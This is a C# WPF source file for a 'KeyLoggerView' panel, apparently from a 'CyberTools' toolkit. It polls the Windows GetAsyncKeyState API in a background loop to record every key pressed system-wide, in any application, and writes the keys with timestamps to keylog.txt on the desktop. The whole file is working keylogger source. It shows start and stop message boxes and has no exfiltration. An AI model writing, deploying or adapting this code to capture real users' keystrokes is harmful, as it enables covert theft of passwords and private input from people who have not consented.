using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;

namespace CyberTools.View
{
    public partial class KeyLoggerView : UserControl
    {
        private bool isLogging = false;
        private StreamWriter? logWriter;
        private string logFilePath;

        public KeyLoggerView()
        {
            InitializeComponent();

            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            logFilePath = Path.Combine(desktopPath, "keylog.txt");
        }

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        private async void StartKeyLogger_Click(object sender, RoutedEventArgs e)
        {
            if (isLogging) return;
            isLogging = true;
            MessageBox.Show($"Key Logger started!\nLog file: {logFilePath}");

            logWriter = new StreamWriter(logFilePath, true) { AutoFlush = true };

            await Task.Run(() =>
            {
                while (isLogging)
                {
                    for (int key = 8; key <= 255; key++)
                    {
                        if ((GetAsyncKeyState(key) & 0x8000) != 0)
                        {
                            string keyPressed = KeyInterop.KeyFromVirtualKey(key).ToString();
                            LogKey(keyPressed);
                        }
                    }
                    Thread.Sleep(50);
                }
            });
        }

        private void LogKey(string key)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                logWriter?.WriteLine($"{DateTime.Now}: {key}");
            });
        }

        private void EndKeyLogger_Click(object sender, RoutedEventArgs e)
        {
            isLogging = false;
            logWriter?.Close();
            MessageBox.Show($"Key Logger stopped!\nLog file saved at: {logFilePath}");
        }
    }
}
